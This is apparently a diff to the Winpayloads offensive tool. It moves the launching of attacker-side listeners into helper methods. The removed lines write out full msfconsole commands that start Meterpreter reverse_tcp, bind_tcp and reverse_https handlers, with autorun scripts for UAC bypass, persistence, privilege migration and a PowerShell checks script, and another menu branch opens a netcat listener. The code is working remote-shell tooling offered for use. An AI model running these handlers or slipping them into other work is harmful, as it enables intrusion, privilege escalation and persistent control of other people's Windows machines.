@@ -1,6 +1,7 @@
 #!/usr/bin/python
 from main import *
 from payloadextras import *
+from startmetasploit import *
 
 
 if not re.search('winpayloads', os.getcwd().lower()):
@@ -222,35 +223,38 @@ try:
 
     if menuchoice == '1':
         os.system('nc -lvp %s' % portnum)
+
     elif menuchoice == '2':
         if want_UACBYPASS.lower() == 'y':
-            os.system('msfconsole -x \'use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set LPORT %s;set LHOST 0.0.0.0;set autorunscript multi_console_command -rc uacbypass.rc;set ExitOnSession false;exploit -j;\'' % portnum)
+            METASPLOIT().metrev_uac(portnum)
         elif want_ALLCHECKS.lower() == 'y':
-            os.system('msfconsole -x \'use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set LPORT %s;set LHOST 0.0.0.0;set autorunscript post/windows/manage/exec_powershell SCRIPT=allchecks.ps1;set ExitOnSession false;exploit -j\'' % portnum)
+            METASPLOIT().metrev_allchecks(portnum)
         elif want_PERSISTENCE.lower() == 'y':
-            os.system('msfconsole -x \'use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set LPORT %s;set LHOST 0.0.0.0;set autorunscript multi_console_command -rc persist.rc;set ExitOnSession false;exploit -j\'' % portnum)
+            METASPLOIT().metrev_persistence(portnum)
         else:
-            os.system('msfconsole -x \'use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set LPORT %s;set LHOST 0.0.0.0;set ExitOnSession false;set autorunscript post/windows/manage/priv_migrate;exploit -j\'' % portnum)
+            METASPLOIT().metrev_normal(portnum)
+
     elif menuchoice == '3':
         bindip = raw_input(
             '\n[*] Target Bind IP Address \n[*] IP> ')
         if want_UACBYPASS.lower() == 'y':
-            os.system('msfconsole -x \'use exploit/multi/handler;set payload windows/meterpreter/bind_tcp;set LPORT %s;set RHOST %s;set autorunscript multi_console_command -rc uacbypass.rc;set ExitOnSession false;exploit -j\'' % (bindport, bindip))
+            METASPLOIT().metbind_uac(bindport,bindip)
         elif want_ALLCHECKS.lower() == 'y':
-            os.system('msfconsole -x \'use exploit/multi/handler;set payload windows/meterpreter/bind_tcp;set LPORT %s;set RHOST %s;set autorunscript post/windows/manage/exec_powershell SCRIPT=allchecks.ps1;set ExitOnSession false;exploit -j\'' % (bindport, bindip))
+            METASPLOIT().metbind_allchecks(bindport,bindip)
         elif want_PERSISTENCE.lower() == 'y':
-            os.system('msfconsole -x \'use exploit/multi/handler;set payload windows/meterpreter/bind_tcp;set LPORT %s;set RHOST %s;set autorunscript multi_console_command -rc persist.rc;set ExitOnSession false;exploit -j\'' % (bindport, bindip))
+            METASPLOIT().metbind_persistence(bindport,bindip)
         else:
-            os.system('msfconsole -x \'use exploit/multi/handler;set payload windows/meterpreter/bind_tcp;set LPORT %s;set RHOST %s;set ExitOnSession false;set autorunscript post/windows/manage/priv_migrate;exploit -j \'' % (bindport, bindip))
+            METASPLOIT().metbind_normal(bindport,bindip)
+
     elif menuchoice == '4':
         if want_UACBYPASS.lower() == 'y':
-            os.system('msfconsole -x \'use exploit/multi/handler;set payload windows/meterpreter/reverse_https;set LPORT %s;set LHOST 0.0.0.0;set autorunscript multi_console_command -rc uacbypass.rc;set ExitOnSession false;exploit -j;\'' % portnum)
+            METASPLOIT().methttp_uac(portnum)
         elif want_ALLCHECKS.lower() == 'y':
-            os.system('msfconsole -x \'use exploit/multi/handler;set payload windows/meterpreter/reverse_https;set LPORT %s;set LHOST 0.0.0.0;set autorunscript post/windows/manage/exec_powershell SCRIPT=allchecks.ps1;set ExitOnSession false;exploit -j\'' % portnum)
+            METASPLOIT().methttp_allchecks(portnum)
         elif want_PERSISTENCE.lower() == 'y':
-            os.system('msfconsole -x \'use exploit/multi/handler;set payload windows/meterpreter/reverse_https;set LPORT %s;set LHOST 0.0.0.0;set autorunscript multi_console_command -rc persist.rc;set ExitOnSession false;exploit -j\'' % portnum)
+            METASPLOIT().methttp_persistence(portnum)
         else:
-            os.system('msfconsole -x \'use exploit/multi/handler;set payload windows/meterpreter/reverse_https;set LPORT %s;set LHOST 0.0.0.0;set ExitOnSession false;set autorunscript post/windows/manage/priv_migrate;exploit -j\'' % portnum)
+            METASPLOIT().methttp_normal(portnum)
 
     raise KeyboardInterrupt
 except KeyboardInterrupt:
